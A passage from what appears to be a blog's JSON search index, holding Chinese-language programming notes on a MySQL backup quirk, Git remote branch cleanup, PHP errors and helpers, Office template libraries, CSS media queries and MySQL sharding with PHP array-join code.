有時間再用用看\n","tags":["software"],"categories":["實用工具"]},{"title":"mysql備份遇到#mysql50#不能匯出的問題","url":"%2Fblog%2F2019%2F05%2F10%2Fmysql%E5%82%99%E4%BB%BD%E9%81%87%E5%88%B0-mysql50-%E4%B8%8D%E8%83%BD%E5%8C%AF%E5%87%BA%E7%9A%84%E5%95%8F%E9%A1%8C%2F","content":"\n今天專案做 mysqldump 時候，遇到`#mysql50#...`資料表不能備份\n等一下，DB 裡面沒有這個資料表\n後來我同事再網路找到了原因\n\n<!--more-->\n\n> 都报错，后来发现，mysql 用户的\\$HOME 目录下有目录.ssh 导致的问题。\n\n[mysql 数据库中出现#mysql50#.ssh 处理方法 - 花名:白起 - CSDN 博客](https://blog.csdn.net/levy_cui/article/details/51395995)\n\n刪除.ssh 資料夾就能解決\n這個雷也太... 囧\n","tags":["mysql"],"categories":["MySQL"]},{"title":"Git刪除Rmote Branch方法","url":"%2Fblog%2F2019%2F05%2F09%2FGit%E5%88%AA%E9%99%A4Rmote-Branch%E6%96%B9%E6%B3%95%2F","content":"\n之前就有類似寫過刪除 remote 分支方法\n但今天想開出來紀錄\n有時候刪除 remote 分支\n但是我發現我本機上面可以看到刪除的分支(`git branch -a`)\n要怎麼解決呢?\n\n<!--more-->\n\n## 本機刪除\n\n```bash\ngit branch -d/-D xxx\n```\n\n## 遠端刪除(但還是會殘留在本機)\n\n```bash\ngit push origin :cat\n```\n\n詳細：[git 刪除遠端(remote)分支和強制 pull 下來分支 | 程式狂想筆記](https://malagege.github.io/blog/2018/11/26/git%E5%88%AA%E9%99%A4%E9%81%A0%E7%AB%AF-remote-%E5%88%86%E6%94%AF/)\n\n## 刪除殘留本機 remote\n\n有時候就是不小心打指令\n結果不小心`checkout`進來，它會新增到我分支\n等於又要重新刪除分支\n\n`git fetch -p` or `git fetch –all –prune`都可以解決\n\n詳細:[關於 Git 刪除 Remote Branch - Yowko's Notes](https://blog.yowko.com/git-delete-remote-branch/)\n[git 远程修剪,git 修剪,git fetch – prune 等之间的区别是什么 - 代码日志](https://codeday.me/bug/20170526/21419.html)\n\n其他小記:\n不修改 commit 內容 `--no-edit`\n[Why is git prompting me for a post-pull merge commit message? - Stack Overflow](https://stackoverflow.com/questions/11744081/why-is-git-prompting-me-for-a-post-pull-merge-commit-message)\n\n[git - Commit without setting user.email and user.name - Stack Overflow](https://stackoverflow.com/questions/22058041/commit-without-setting-user-email-and-user-name)\n\n顯示 git commit 修程式\n`git log --name-only`\n[How to have git log show filenames like svn log -v - Stack Overflow](https://stackoverflow.com/questions/1230084/how-to-have-git-log-show-filenames-like-svn-log-v)\n","tags":["git"],"categories":["Git"]},{"title":"MySQL轉出DB設計文件方法","url":"%2Fblog%2F2019%2F05%2F09%2FMySQL%E8%BD%89%E5%87%BADB%E8%A8%AD%E8%A8%88%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95%2F","content":"\n最近專案很趕\n今天收到要把目前所有建立的 table 用成設計書\n雖然之前有寫過[從 MySQL 裡面直接(select)讀取出文件設計書表格格式 | 程式狂想筆記](https://malagege.github.io/blog/2019/01/19/%E8%AE%80%E5%8F%96%E5%87%BA%E6%96%87%E4%BB%B6%E8%A8%AD%E8%A8%88%E6%9B%B8%E8%A1%A8%E6%A0%BC%E6%A0%BC%E5%BC%8F/)\n但還是查一下有沒有現成，又好看的工具:P\n\n<!--more-->\n\n結果找了不多\n\n## doc us(Laravel)\n\n[GitHub - UniSharp/doc-us: A MySQL Schema Documentation Generator for Laravel.](https://github.com/UniSharp/doc-us)\n[Laravel 好用工具，幫你快速生成 MySQL schema 文件 - UniSharp blog](https://blog.unisharp.com/2017/10/31/Laravel%20%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7%EF%BC%8C%E5%B9%AB%E4%BD%A0%E5%BF%AB%E9%80%9F%E7%94%9F%E6%88%90%20MySQL%20schema%20%E6%96%87%E4%BB%B6/)\n\n[快速繪製 Db Schema(ERD) 的軟體 - DbSchema | Tsung's Blog](https://blog.longwin.com.tw/2009/08/linux-draw-db-schema-tool-2009/)\n\n## PHPWORD\n\n[使用 PHPWord 產生 MySQL 資料庫結構文件 | hoyo 學習紀錄](https://blog.hoyo.idv.tw/?p=2547)\nhttp://sandbox.onlinephpfunctions.com/code/c04fc96a535281378127cb498591c5b6136f68fb\n\n有空實際用在來寫...\n\n小記在這邊(應該沒有機會寫)\n[MySQL 快速複製 Table 的方法 | Tsung's Blog](https://blog.longwin.com.tw/2013/08/mysql-copy-table-command-2013/)\n","tags":["doc"],"categories":["實用工具"]},{"title":"Strict Standards: Only variables should be passed by reference","url":"%2Fblog%2F2019%2F05%2F09%2FStrict-Standards-Only-variables-should-be-passed-by-reference%2F","content":"\n最近 php 預設設個錯誤\n但我程式沒有寫錯...\n後來找了一下，參照不能代入 function 裡面\n如這個`$price = array_shift(get_product_price($product_key));`\n\n因為忘了第二次，所以獨立寫一篇\n\n```php\n$product_price = get_product_price($product_key);\n$price = array_shift($product_price);\n```\n\n[臨時筆記: ［PHP］Error: Only variables should be passed by reference](http://temporarynotesssss.blogspot.com/2015/03/phperror-only-variables-should-be.html)\n[PHP 有關參照(Reference)的那些事 | 程式狂想筆記](https://malagege.github.io/blog/2019/01/28/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/)其實我以前就有提到 orz\n","tags":["php"],"categories":["PHP"]},{"title":"隨機當天指定固定日期方法","url":"%2Fblog%2F2019%2F05%2F09%2F%E9%9A%A8%E6%A9%9F%E7%95%B6%E5%A4%A9%E6%8C%87%E5%AE%9A%E5%9B%BA%E5%AE%9A%E6%97%A5%E6%9C%9F%E6%96%B9%E6%B3%95%2F","content":"\n最近專案目前沒有現在時間資料\n只有過去資料(產生當日排程還沒寫完)\n但是為了要讓當然排名正常\n所以我想了一個寫指定抓固定日期方法\n\n<!--more-->\n\n```php\n\n\nfunction fakeDay( $nowDay = null ){\n    if(!isset($nowDay)){\n        $nowDay = date('Y-m-d');\n    }\n    $today = $nowDay;\n    $firstday = '2018-01-01'; //寫入有資料的區間\n    $lastday  = '2018-12-31';  //寫入有資料的區間\n    $firstday_unixday = strtotime( $firstday ) / (60*60*24);\n    $lastday_unixday  = strtotime( $lastday ) / (60*60*24);\n\n    $range =  ($lastday_unixday - $firstday_unixday + 1 ) > 0 ? ($lastday_unixday - $firstday_unixday + 1 ) : 1;\n\n    $add_date = (strtotime($today)/(60*60*24)) % $range;\n\n    $fake_today = date('Y-m-d', strtotime(\"$firstday + $add_date day\"));\n    echo $fake_today;\n}\n\n\n\necho fakeDay() . \"\\n\";\necho fakeDay(date('Y-m-d',strtotime('now + 1 day'))) . \"\\n\";\n```\n\nhttp://sandbox.onlinephpfunctions.com/code/10c72c5b521557c14f61d73e702864037a9d2d52\n\n簡單小記\n\n1. PHP 參照運算式不能寫在 function 裡面，如這邊問題\n2. 由於 php function 能設定預設值，但沒辦法`function fakeDay($nowDay = date('Y-m-d')){...}`\n   正常會寫 isset()去做預設值方法\n\n參考連結:\n[date - how to pass current year as default argument in php function - Stack Overflow](https://stackoverflow.com/questions/20520019/how-to-pass-current-year-as-default-argument-in-php-function)\n","tags":["date"],"categories":["PHP"]},{"title":"Word,Excel的相關template套件小記","url":"%2Fblog%2F2019%2F05%2F05%2FWord-Excel%E7%9A%84%E7%9B%B8%E9%97%9Ctemplate%E5%A5%97%E4%BB%B6%E5%B0%8F%E8%A8%98%2F","content":"\n最近朋友問我有沒有用程式方法套進去 Word\n不過我平常沒有這個需求\n我是有跟他提到有 合併列印、VBA\n但是查了一下\n竟然發現找到[【茶包射手日記】純 JavaScript DOCX 套版元件 Debug-黑暗執行緒](https://blog.darkthread.net/blog/pure-js-docx-template-print/?fbclid=IwAR10as2G6yN_tM4_dsY_TEFOjdA-OIXq86hG5Qe7hS6SZNd2pxZYA6loynA)\n原來網頁版 js 就能做到這種事\n\n<!--more-->\n\n但我覺得應該還有很多東西\n所以整理一下\n\n因為我有先找到[js-excel-template - npm](https://www.npmjs.com/package/js-excel-template)\n內容兩個圖片，就讓我想馬上測試官網的範例\n首先有很複雜的表不建議使用這個\n\n1. sheet 多筆資料不會套用\n2. 塞多筆 table 資料，可能下面用總計，不會自動往下移\n3. Excel 有設定一些格式不會用\n\n測試程式\n\n```test_excel.js\nconst JsExcelTemplate = require(\"js-excel-template/nodejs/nodejs\").default;\nconst excelTemplate = JsExcelTemplate.fromFile(\"test.xlsx\");\n\nexcelTemplate.set(\"name\", \"John\");\nexcelTemplate.set(\"age\", 123);\nexcelTemplate.set(\"now\", new Date());\nexcelTemplate.set(\"isBoy\", true);\nexcelTemplate.set(\"isGirl\", false);\n\nconst students = [\n  { name: \"Tommy\", age: 12 },\n  { name: \"Philips\", age: 13 },\n  { name: \"Sara\", age: 14 },\n  { name: \"中文測試\", age: 14 }\n];\n\nfor (let i = 1; i <= 5; i++) {\n  if (i <= students.length) {\n    excelTemplate.set(`name${i}`, students[i - 1].name);\n    excelTemplate.set(`age${i}`, students[i - 1].age);\n  } else {\n    excelTemplate.set(`name${i}`, \"\");\n    excelTemplate.set(`age${i}`, \"\");\n  }\n}\nexcelTemplate.set(\n  \"average\",\n  students.reduce((p, c) => p + c.age, 0) / students.length\n);\n\nexcelTemplate.set(\"students\", students);\n\n// nodejs:\nexcelTemplate.saveAs(\"out.xlsx\");\n```\n\n雖然不推薦，但適合做單頁式報表\n\n- [Templater - reporting Library for .NET and Java](https://templater.info/)\n- [GitHub - wilson6/NPOI-Template: C# 根据 NPOI 模版去生成复杂的 EXCEL 表格，标签化。](https://github.com/wilson6/NPOI-Template)\n- [GitHub - optilude/xlsx-template: A NodeJS module to generate Excel files in .xlsx format from a template created with Excel itself](https://github.com/optilude/xlsx-template)\n- [GitHub - ivahaev/go-xlsx-templater: Simple xlsx template based document generator](https://github.com/ivahaev/go-xlsx-templater)\n- [GitHub - ngs-doo/TemplaterExamples: Creating reports in .NET and Java](https://github.com/ngs-doo/TemplaterExamples)\n- [GitHub - anmoroz/xlsx-template-php: A library for templating of Excel Office documents. Supports MS Excel xlsx. Uses PHPExcel library.](https://github.com/anmoroz/xlsx-template-php)\n- [GitHub - optimistex/xlsx-template-ex: The template engine for generate xlsx documents](https://github.com/optimistex/xlsx-template-ex)\n- [poi-tl](http://deepoove.com/poi-tl/)\n- [GitHub - shadz3rg/PHPStamp: The XSL-way templating library for MS Office Word DOCX documents.](https://github.com/shadz3rg/PHPStamp)\n- [GitHub - guigrpa/docx-templates: Template-based docx report creation](https://github.com/guigrpa/docx-templates)\n- [GitHub - legion-zver/go-docx-templates](https://github.com/legion-zver/go-docx-templates)\n- [GitHub - Skrol29/opentbs: With OpenTBS you can merge OpenOffice - LibreOffice and Ms Office documents with PHP using the TinyButStrong template engine. Simple use OpenOffice - LibreOffice or Ms Office to edit your templates : DOCX, XLSX, PPTX, ODT, OSD, ODP and other formats. That is the Natural Template philosophy.](https://github.com/Skrol29/opentbs)\n- [GitHub - guigrpa/docx-templates: Template-based docx report creation](https://github.com/guigrpa/docx-templates)\n\n... 太多了，不列了\n\n目前[GitHub - Skrol29/opentbs: With OpenTBS you can merge OpenOffice - LibreOffice and Ms Office documents with PHP using the TinyButStrong template engine. Simple use OpenOffice - LibreOffice or Ms Office to edit your templates : DOCX, XLSX, PPTX, ODT, OSD, ODP and other formats. That is the Natural Template philosophy.](https://github.com/Skrol29/opentbs)、[GitHub - optilude/xlsx-template: A NodeJS module to generate Excel files in .xlsx format from a template created with Excel itself](https://github.com/optilude/xlsx-template)這幾個星星數比較多\n\n[Exwog - from Excel to Word reports generator (xls to doc, xlsx to docx) by template](https://exwog.com/)\n[GitHub - HY-Org/hy.common.report: 报表、Excel 操作类库。Java 转 Excel、Excel 转 Java](https://github.com/HY-Org/hy.common.report)\n[GitHub - hanzhaoxin/ExcelReport: This reporting engine is built on NPOI.](https://github.com/hanzhaoxin/ExcelReport)\n[GitHub - Jimmy-JS/laravel-report-generator: Rapidly Generate Simple Pdf, CSV, & Excel Report Package on Laravel](https://github.com/Jimmy-JS/laravel-report-generator)\n[GitHub - biezhi/excel-plus: ❇️ Improve the productivity of the Excel operation library. https://git.io/vNjQy](https://github.com/biezhi/excel-plus)\n\n\n**2019-09-08**\n可以看這篇[php-excel-templator 用範本(template)快速產生Excel方法 | 程式狂想筆記](https://malagege.github.io/blog/2019/09/03/php-excel-templator-%E7%94%A8%E7%AF%84%E6%9C%AC-template-%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9FExcel%E6%96%B9%E6%B3%95/)","tags":["template"],"categories":["實用工具"]},{"title":"CSS設定響應式(RWD)有幾種方法","url":"%2Fblog%2F2019%2F05%2F05%2FCSS%E8%A8%AD%E5%AE%9A%E9%9F%BF%E6%87%89%E5%BC%8F-RWD-%E6%9C%89%E5%B9%BE%E7%A8%AE%E6%96%B9%E6%B3%95%2F","content":"\n最近看 SASS 有設定@media 方法\n再仔細查了一下，還有別種寫法\n有看到一些自己不會這樣寫的\n特別筆記一下\n\n<!--more-->\n\n## 一般常見寫法\n\n一般常見這種寫法\n`@media screen and (min-width: 400px) and (max-width: 700px)`\n\n這種寫法順序會比較安全\n\n```css\n@media screen and (min-width: 400px) and (max-width: 700px) {\n  .header {\n  }\n}\n```\n\n## 特別寫法\n\n在[使用 sass mixin 來開發 responsive 網站 | Hello Santa web design,drupal and more](https://blog.hellosanta.com.tw/%E7%B6%B2%E7%AB%99%E8%A8%AD%E8%A8%88/%E5%89%8D%E7%AB%AF/%E4%BD%BF%E7%94%A8sass-mixin%E4%BE%86%E9%96%8B%E7%99%BCresponsive%E7%B6%B2%E7%AB%99)裡面有看到這種寫法\n\n```css\n.div{\n         //desktop\n         @media all and (min-width: 960px) {\n                padding:20px;\n          }\n         //pad\n         @media all and (min-width: 760px) and (max-width: 959px) {\n              padding:10px;\n         }\n         //mini pad\n         @media all and (min-width: 480px) and (max-width: 759px) {\n               padding:5px;\n         }\n         //mobile\n         @media all and (max-width: 480px) {\n               padding:0px;\n         }\n      }\n}\n```\n\n沒想到 media 可以放在裡面\n這樣寫也比較不會亂\n\n## 簡單寫法(需要小心順序)\n\n```css\n.header {\n  padding: 20px;\n}\n//pad\n@media (max-width: 959px) {\n  .header {\n    padding: 10px;\n  }\n}\n//mini pad\n@media (max-width: 759px) {\n  .header {\n    padding: 5px;\n  }\n}\n//mobile\n@media (max-width: 480px) {\n  .header {\n    padding: 0px;\n  }\n}\n```\n\n> 建議是只寫 max-width 的話由大像素寫到小像素，min-width 按小像素到大像素的順序，從上往下寫，不然會達不到控制的樣式目的。\n\n這種寫法可能需要注意順序，可參考[@media screen 的書寫順序 - WEB 前端娃——steiny - CSDN 博客](https://blog.csdn.net/cmlddcml/article/details/48973589)\n\n## SASS 寫法\n\n用 mixin 方法，但這邊使用上面簡單方法設定\n\n```sass\n// device\n$mobile: 568px;\n$pad: 768px;\n$desktop: 960px;\n\n// color\n$red: #ff0000;\n$black: #000;\n\n@mixin mobile {\n    @media (max-width: $mobile) {\n        @content;\n    }\n}\n\n@mixin pad {\n    @media (max-width: $pad) {\n        @content;\n    }\n}\n\n@mixin desktop {\n    @media (max-width: $desktop) {\n        @content;\n    }\n}\n\n\n\n.header{\n    color: $black;\n    @include pad{\n        color: $red;\n    }\n    @include mobile{\n        display: none;\n    }\n}\n\n```\n\n## 深入了解\n\n### @media max-width 和 min-width 順序問題\n\n深入了解[@media screen 的書寫順序 - WEB 前端娃——steiny - CSDN 博客](https://blog.csdn.net/cmlddcml/article/details/48973589)\n\n@media (max-width: 959px) //裝置小於 959 會進來\n@media (max-width: 759px) //裝置小於 759 會進來\n@media (max-width: 480px) //裝置小於 480 會進來\n\n但是寫反會遇到什麼事情\n\n裝置 300 因為 CSS 順序關係，所以會吃到 959 的設定\n@media (max-width: 480px) //裝置小於 480 會進來\n@media (max-width: 759px) //裝置小於 759 會進來\n@media (max-width: 959px) //裝置小於 959 會進來\n\n[@media screen 的書寫順序 - WEB 前端娃——steiny - CSDN 博客](https://blog.csdn.net/cmlddcml/article/details/48973589)\n簡單口決真的記得\n\n> 建議是只寫 max-width 的話由大像素寫到小像素，min-width 按小像素到大像素的順序，從上往下寫，不然會達不到控制的樣式目的。\n\n### @media 的 screen 可以省略\n\n為什麼我看有些 code 裡面的@media 可以省略?\n翻了[@media - CSS | MDN](https://developer.mozilla.org/zh-TW/docs/Web/CSS/@media#media-type)沒有寫\n不過找到[前端新手村 Media Query - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10194937)\n裡面有提\n\n> media type 是 all 時，可以省略。\n\n不過我之前專案有用到@media print 功能\n只要用 CSS 就能調整列印樣式\n真的是很方便\n\n[Print —— 被埋没的 Media Type – 腾讯 CDC](https://cdc.tencent.com/2014/08/19/print-%E8%A2%AB%E5%9F%8B%E6%B2%A1%E7%9A%84media-type/)\n\n### 有關於 compass\n\n當出學 SASS 的時候，有看到 compass\n但最近感覺很少人提到 compass\n所以我有查了一下\n原來 compass 已經很久沒更新了\n\nCompass 有哪些好處呢?裡面[[scss]Compass | hannahpun](https://www.hannahpun.me/compass/)裡面 2 個我覺得不錯\n\n> 1. Sprite\n> 2. Helper 函數( image-width,image-height 太神!!!)\n\n取代 compass 我查到用 gulp 或 webpack 做 sprite、CSS3 各瀏覽器的 CSS 可以通過 postcss 解決\n\n- [Compass 替代方案(1) - 更快速的 Sass | 卡斯伯 Blog - 前端，沒有極限](https://wcc723.github.io/sass/2015/12/20/replace-compass-with-node-sass/?utm_source=tuicool&utm_medium=referral)\n- [Compass 替代方案(2) - 透過 PostCSS，停止加入不必要的 prefix | 卡斯伯 Blog - 前端，沒有極限](https://wcc723.github.io/sass/2015/12/25/replace-compass-with-node-sass-2/)\n- [Compass 替代方案(3) - 加入 SVG Sprites | 卡斯伯 Blog - 前端，沒有極限](https://wcc723.github.io/sass/2016/01/03/replace-compass-with-node-sass-3/)\n\n上面有機會用的話，再來詳細筆記\n\nPS: 當然 image-width,image-height 目前沒有解決方案\n\n參考來源：\n\n- [Mobile Web 前端技術筆記(二): Media Queries 與 CSS – 烏托比亞](https://hsinyu00.wordpress.com/2011/04/05/mobile-web-media-queries/)\n- [@media screen 的书写顺序 - WEB 前端娃——steiny - CSDN 博客](https://blog.csdn.net/cmlddcml/article/details/48973589)\n- [使用 sass mixin 來開發 responsive 網站 | Hello Santa web design,drupal and more](https://blog.hellosanta.com.tw/%E7%B6%B2%E7%AB%99%E8%A8%AD%E8%A8%88/%E5%89%8D%E7%AB%AF/%E4%BD%BF%E7%94%A8sass-mixin%E4%BE%86%E9%96%8B%E7%99%BCresponsive%E7%B6%B2%E7%AB%99)\n- [CSS Media Queries 詳細介紹 - OXXO.STUDIO](https://www.oxxostudio.tw/articles/201810/css-media-queries.html)\n- [[scss]Compass | hannahpun](https://www.hannahpun.me/compass/)\n- [Compass 替代方案(1) - 更快速的 Sass | 卡斯伯 Blog - 前端，沒有極限](https://wcc723.github.io/sass/2015/12/20/replace-compass-with-node-sass/?utm_source=tuicool&utm_medium=referral)\n- [Sass 的@import @mixin @content @extend 與@function « StevenTTuD's notes](http://steventtud.logdown.com/posts/2015/06/01/279546)\n- [Sass 教學 (11) - @content - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10156850)\n","tags":["media"],"categories":["CSS"]},{"title":"MySQL sharding初步認識小記","url":"%2Fblog%2F2019%2F05%2F03%2FMySQL-sharding%E5%88%9D%E6%AD%A5%E8%AA%8D%E8%AD%98%E5%B0%8F%E8%A8%98%2F","content":"\n之前有做 Sharding 簡單紀錄[MySQL 不錯優化文章&DB 雜記 | 程式狂想筆記](https://malagege.github.io/blog/2018/12/27/MySQL%E4%B8%8D%E9%8C%AF%E5%84%AA%E5%8C%96%E6%96%87%E7%AB%A0-DB%E9%9B%9C%E8%A8%98/)\n最近工作上發現我還是沒有很了解 Sharding\n在工作上有很大的誤解\n當然這篇不會記錄到很深入\n只是記錄我的錯誤觀念改正\n\n<!--more-->\n\n## 首先做 Sharding，不能做 join 動作\n\n因為先前開會，對方沒有講很清楚\n我以為部分資料表可以同步到別的 Database\n想說還是能做 join 問題\n(沒想到沒有適用 mariadb sharding 功能)\n但是，最近問相關問題的時候\n問到 join 相關事情，有得到消息是`不能做join`事情\n當然也不會使用到類似 MariaDB Spider 東西\n連線所有抓資料`要用程式處理`\n當然有些 count,group by 動作可能都用程式處理了\n\n~~當然想說這麼複雜的東西交給工程師用很冏~~\n\n> 3、跨節點合併排序分頁問題\n> 一旦進行了數據的水平切分之後，可能就並不僅僅只有跨節點 Join 無法正常運行，有些排序分頁的 Query 語句的數據源可能也會被切分到多個節點，這樣造成的直接後果就是這些排序分頁 Query 無法繼續正常運行。其實這和跨節點 Join 是一個道理，數據源存在於多個節點上，要通過一個 Query 來解決，就和跨節點 Join 是一樣的操作。同樣 Federated 也可以部分解決，當然存在的風險也一樣。\n> 還是同樣的問題，怎麼辦？我同樣仍然繼續建議通過應用程序來解決。\n> 如何解決？解決的思路大體上和跨節點 Join 的解決類似，但是有一點和跨節點 Join 不太一樣，Join 很多時候都有一個驅動與被驅動的關係，所以 Join 本身涉及到的多個表之間的數據讀取一般都會存在一個順序關係。但是排序分頁就不太一樣了，排序分頁的數據源基本上可以說是一個表（或者一個結果集），本身並不存在一個順序關係，所以在從多個數據源取數據的過程是完全可以並行的。這樣，排序分頁數據的取數效率我們可以做的比跨庫 Join 更高，所以帶來的性能損失相對的要更小，在有些情況下可能比在原來未進行數據切分的數據庫中效率更高了。當然，不論是跨節點 Join 還是跨節點排序分頁，都會使我們的應用服務器消耗更多的資源，尤其是內存資源，因為我們在讀取訪問以及合併結果集的這個過程需要比原來處理更多的數據。\n> 分析到這裡，可能很多讀者朋友會發現，上面所有的這些問題，我給出的建議基本上都是通過應用程序來解決。大家可能心裡開始犯嘀咕了，是不是因為我是 DBA，所以就很多事情都扔給應用架構師和開發人員了？\n> 其實完全不是這樣，首先應用程序由於其特殊性，可以非常容易做到很好的擴展性，但是數據庫就不一樣，必須借助很多其他的方式才能做到擴展，而且在這個擴展過程中，很難避免帶來有些原來在集中式數據庫中可以解決但被切分開成一個數據庫集群之後就成為一個難題的情況。要想讓系統整體得到最大限度的擴展，我們只能讓應用程序做更多的事情，來解決數據庫集群無法較好解決的問題。\n> 作者：浮浮尘尘\n> 链接：https://www.jianshu.com/p/6ebafabfddae\n> 来源：简书\n> 简书著作权归作者所有，任何形式的转载都请联系作者获得授权并注明出处。\n\n~~看著看著眼淚掉出來~~\n\n- [数据库 Sharding 的基本思想和切分策略 - Laurence 的技术博客 - CSDN 博客](https://blog.csdn.net/bluishglc/article/details/6161475)\n- [MySQL Sharding 详解 - 简书](https://www.jianshu.com/p/6ebafabfddae)\n- [MySQL 分库分表，写得太好了！ - 51CTO.COM](http://database.51cto.com/art/201809/583857.htm)\n- [MySQL 上 sharding 的方案 | Gea-Suan Lin's BLOG](https://blog.gslin.org/archives/2017/02/02/7113/mysql-%E4%B8%8A-sharding-%E7%9A%84%E6%96%B9%E6%A1%88/)\n- [MySQL 不錯優化文章&DB 雜記 | 程式狂想筆記](https://malagege.github.io/blog/2018/12/27/MySQL%E4%B8%8D%E9%8C%AF%E5%84%AA%E5%8C%96%E6%96%87%E7%AB%A0-DB%E9%9B%9C%E8%A8%98/)\n- [数据库 Sharding 的基本思想和切分策略（分库分表） | 忆桐之家的博客](http://hongyitong.github.io/2016/12/16/%E5%88%86%E8%A1%A8%E5%88%86%E5%BA%93%EF%BC%88%E6%95%B0%E6%8D%AE%E5%BA%93%E6%80%A7%E8%83%BD%E8%B0%83%E4%BC%98%EF%BC%89%20/)\n- [方案虽好，成本先行：数据库 Sharding+Proxy 实践解析 - MySQL - dbaplus 社群：围绕 Data、Blockchain、AiOps 的企业级专业社群。技术大咖、原创干货，每天精品原创文章推送，每周线上技术分享，每月线下技术沙龙。](https://dbaplus.cn/news-11-1854-1.html)\n- [MySql 從一竅不通到入門（五）Sharding：分表、分庫、分片和分割槽 - IT 閱讀](https://www.itread01.com/content/1545726433.html)\n- [MySql 从一窍不通到入门（九）Sharding 的实现和规避 - Invoker's Tower - CSDN 博客](https://blog.csdn.net/KingCat666/article/details/78325158)\n- [现在 mysql 的分布式数据访问层主流方案有哪些? - 知乎](https://www.zhihu.com/question/22521550)\n- [传统分库分表(sharding)的缺陷与破解之法-云栖社区-阿里云](https://yq.aliyun.com/articles/404971)\n\n## 分表方式\n\n1. 用非 Sharding 某一張記錄 sharding，如[MySQL 分库分表，写得太好了！ - 51CTO.COM](http://database.51cto.com/art/201809/583857.htm)\n\n用程式去做導向動作\n\n2. 用%(程式餘數)去做分割\n\n當初看這段有想到之後擴增 Sharding 不是要做資料轉移\n剛好這篇有提到 [数据库 sharding 和一致性哈希算法 - 言川的博客 - CSDN 博客](https://blog.csdn.net/lihongxun945/article/details/51482903)\n擴增事要做資料轉移的\n\n現有 code，可以參考 open bilibili 有實作這個功能 XDD\n\n## Sharding 各 table 的主鍵 id 不能重複\n\n1.  Sharding DB 設定 auto_increment 起始不一樣。(ex:DB1 0, DB2 10000000)\n2.  拿不會重複資料串流水號，(EX:(USER_ID)UUID+id)\n\n## 另類 DB 實作作法\n\n> Vitess 就是由 Youtube 團隊為了解決資料量龐大、邏輯複雜導致 Query 的錯誤率升高，讓 Youtube 工程團隊有解不完的 Bug、加不完的班。又幸好當時寫這套前端窗口的人致力開源這份程式碼，才讓後世的人能不用辛苦地寫一份這種可怕的東西(我想也沒多少人寫得出來)。\n\n[对比 Vitess，ShardingSphere 有哪些不同](https://www.infoq.cn/article/NHSAAmN*MfpLiTiTTEu5)\n[Mysql --- sharding , partitioning | Richard's Blog](https://a28283878.github.io/documents/Database-Scaling-Vitess.html)\nkingshard\n[kingshard/how_to_use_kingshard.md at master · flike/kingshard · GitHub](https://github.com/flike/kingshard/blob/master/doc/KingDoc/how_to_use_kingshard.md)\n\n## 我有個大膽的想法\n\n如果兩個 Array 做 join 動作有什麼做法?\n\n後來有找到這個\n[LINQ PHP 比較：YaLinqo，Ginq，Pinq*Web 開發*幫酷](https://hant.helplib.com/Web_Development/article_3813)\n[YaLinqo port de .NET 4 LINQ vers PHP - Par l'exemple](http://io.gchatelier.fr/blog/yalinqo-linq-php-exemple/#joio)\n\n**Yalinqo 裡面的 join 跟 SQL Join 好像不太一樣**\n當然也有找到程式自幹的，[How to simulate the SQL LEFT JOIN operation using PHP arrays? - Stack Overflow](https://stackoverflow.com/questions/25836473/how-to-simulate-the-sql-left-join-operation-using-php-arrays)\n\n```js\n//function to simulate the left join\n    function left_join_array($left, $right, $left_join_on, $right_join_on = NULL){\n        $final= array();\n\n        if(empty($right_join_on))\n            $right_join_on = $left_join_on;\n\n        foreach($left AS $k => $v){\n            $final[$k] = $v;\n            foreach($right AS $kk => $vv){\n                if($v[$left_join_on] == $vv[$right_join_on]){\n                    foreach($vv AS $key => $val)\n                        $final[$k][$key] = $val;\n                } else {\n                    foreach($vv AS $key => $val)\n                        $final[$k][$key] = NULL;\n                }\n            }\n        }\n       return $final;\n    }\n```\n\n比較特別要 join 兩個欄位，名稱可以不一樣，所以後面兩個參數是用來對應關聯屬性\n我這邊有簡單實作[PHP Sandbox, test PHP online, PHP tester](http://sandbox.onlinephpfunctions.com/code/72c7b55bc7cf39f57454c5641e9e1ffd4758b178)\n\n後來發現 join 空資料時候會有問題，小小修正\n\n```js\n    function left_join_array($left, $right, $left_join_on, $right_join_on = NULL){\n        $final= array();\n\n        if(empty($right_join_on))\n            $right_join_on = $left_join_on;\n\n        foreach($left AS $k => $v){\n            $final[$k] = $v;\n            foreach($right AS $kk => $vv){\n                if($v[$left_join_on] == $vv[$right_join_on]){\n                    foreach($vv AS $key => $val)\n                        $final[$k][$key] = $val;\n                } else {\n                    foreach($vv AS $key => $val){\n                        if($key == $left_join_on) continue;\n                        $final[$k][$key] = NULL;\n                    }\n\n                }\n            }\n        }\n       return $final;\n    }\n```\n\n改寫 inner join\n\n```js\n    function left_join_array($left, $right, $left_join_on, $right_join_on = NULL){\n        $final= array();\n\n        if(empty($right_join_on))\n            $right_join_on = $left_join_on;\n\n        foreach($left AS $k => $v){\n            foreach($right AS $kk => $vv){\n                if($v[$left_join_on] == $vv[$right_join_on]){\n                    $final[$k] = $v;\n                    foreach($vv AS $key => $val)\n                        $final[$k][$key] = $val;\n                }\n            }\n        }\n       return $final;\n    }\n```\n\n### 找到其他套件\n\n[GitHub - erdalceylan/array-join: php array join](https://github.com/erdalceylan/array-join)\n\n### 排序問題\n\n[php - How to Sort Multi-dimensional Array by Value? - Stack Overflow](https://stackoverflow.com/questions/2699086/how-to-sort-multi-dimensional-array-by-value)\n\n### 效能上的問題\n\n> 其次你 left_join_array 功能是一個問題，它的速度是 O(n^3)，速度很慢，並儘可能內存去你分配噸也是如此，但在我們談論如何優化數據之前，我需要更多關於您想要處理數據的信息。\n> MySQL 將總是比任何你能在幾分鐘內寫速度更快，尤其是如果你沒有關於如何 RDBMS 工作的任何知識。您可以儘可能多地模擬它，但 MySQL 應該至少快一個數量級; MySQL 的連接算法是 O((n*m) log(n*m))，你的算法指數級地慢（字面上）。\n\n[PHP 脚本 - VoidCC](http://cn.voidcc.com/question/p-vznlcvcp-tn.html)\n[algorithm - PHP script for optimizing loading CSV data - Stack Overflow](https://stackoverflow.com/questions/46408886/php-script-for-optimizing-loading-csv-data/46409077#46409077)\n請用在資料少上面\n\n### 物件快速轉陣列方法\n\n`json_decode(json_encode(\\$products), true);`\n[Convert PHP object to associative array - Stack 